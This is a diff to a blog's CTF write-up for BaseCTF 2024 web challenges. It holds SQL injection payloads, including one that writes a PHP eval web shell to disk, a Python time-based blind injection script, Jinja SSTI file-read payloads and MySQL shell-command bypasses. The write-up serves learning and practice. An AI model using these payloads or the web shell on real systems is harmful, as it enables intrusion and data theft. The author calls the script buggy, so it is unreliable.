@@ -187,11 +187,15 @@ up">
 <p><img src="/source/images/2024BaseCTF-web/image-20240907162619965.png" alt="image-20240907162619965"></p>
 <p>想这样直接读flag文件，放包后显示污染成功。然后我们访问&#x2F;read，此时已经读取到了flag</p>
 <h3 id="only-one-sql"><a href="#only-one-sql" class="headerlink" title="only one sql"></a>only one sql</h3><p><img src="/source/images/2024BaseCTF-web/37.png"></p>
-<p>学到了代替select的方法：values</p>
+<p><strong>方法一</strong>：学到了代替select的方法：values</p>
 <p>?sql&#x3D;values(0x3c3f706870206576616c28245f504f53545b2761275d293b3f3e) into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;a.php’</p>
 <p>将一句话木马<?php eval($_POST['a']);?>转为16进制写入文件中，然后访问</p>
 <p><img src="/source/images/2024BaseCTF-web/36.png"></p>
 <p>即可查看flag</p>
+<p><strong>方法二</strong>：show tables查看表，发现flag表，然后show columns from flag查字段发现两个字段，一个id一个data。盲猜flag在data字段。写脚本–时间盲注</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">sqlstr=string.ascii_lowercase + string.digits +<span class="string">&#x27;_&#x27;</span>+ <span class="string">&quot;&#123;&#125;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://your.url/?sql=delete%20from%20flag%20where%20data%20like%20%27&quot;</span></span><br><span class="line">end=<span class="string">&quot;%25%27%20and%20sleep(5)&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> sqlstr:</span><br><span class="line">        payload =url+flag+c+end</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.get(payload,timeout=<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(flag+c)</span><br><span class="line">            flag+=c</span><br></pre></td></tr></table></figure>
+
+<p>这个代码感觉有毛病，每次运行结果都不一样</p>
 <h1 id="Fin"><a href="#Fin" class="headerlink" title="Fin"></a>Fin</h1><h3 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php"></a>1z_php</h3><p>主要考点:回溯绕过非贪婪匹配</p>
 <p><img src="/source/images/2024BaseCTF-web/34.png"></p>
 <p>第一个要求传参e_m.p 但是get传参参数名中有.会被转换为_，我们传参e[m.p这样[会被转换为下划线后面.就不会被转换成下划线了。</p>
@@ -208,6 +212,25 @@ up">
 <p>git clone <a target="_blank" rel="noopener" href="https://github.com/gakki429/Git_Extract">https://github.com/gakki429/Git_Extract</a></p>
 <p>cd Git_Extract</p>
 <p>python 2 git_extract.py URL&#x2F;.git&#x2F;</p>
+<h3 id="Jinja-Mark"><a href="#Jinja-Mark" class="headerlink" title="Jinja Mark"></a>Jinja Mark</h3><p><img src="/source/images/2024BaseCTF-web/38.png"></p>
+<p>&#x2F;index路由是ssti注入(有过滤)，我们先去&#x2F;flag提示我们要爆破找数字.bp抓包爆破</p>
+<p><img src="/source/images/2024BaseCTF-web/39.png"></p>
+<p><img src="/source/images/2024BaseCTF-web/40.png"></p>
+<p>第一行告诉我们&#x2F;index路由里的过滤是{}  然后&#x2F;magic可以进行原型链污染</p>
+<p> <img src="/source/images/2024BaseCTF-web/41.png"></p>
+<p>污染成功，取index路由进行ssti注入即可</p>
+<p>payload: &lt;&lt;lipsum.__globals__.__builtins__.open(‘flag’).read()&gt;&gt;</p>
+<h3 id="RCE-or-Sql-Inject"><a href="#RCE-or-Sql-Inject" class="headerlink" title="RCE or Sql Inject"></a>RCE or Sql Inject</h3><p><img src="/source/images/2024BaseCTF-web/42.png"></p>
+<p>%0a换行符过掉–注释符</p>
+<p>mysql命令行中system和\!可以直接执行一个系统shell命令。</p>
+<p>payload: ?sql&#x3D;%0a system env</p>
+<h3 id="Sql-Inject-or-RCE"><a href="#Sql-Inject-or-RCE" class="headerlink" title="Sql Inject or RCE"></a>Sql Inject or RCE</h3><p>过滤增多了一点，上一题的没法用了，但是这题学到好多知识</p>
+<p>delimiter：更改mysql语句的结束符</p>
+<p><img src="/source/images/2024BaseCTF-web/43.png"></p>
+<p>于是乎，找到代替;的方法了，那么便可以进行堆叠注入了</p>
+<p>select被禁，我们用handler</p>
+<p><img src="/source/images/2024BaseCTF-web/44.png"></p>
+<p>payload:%0adelimiter aa%0ahandler flag openaa%0ahandler flag read next</p>
 </section>
     
         
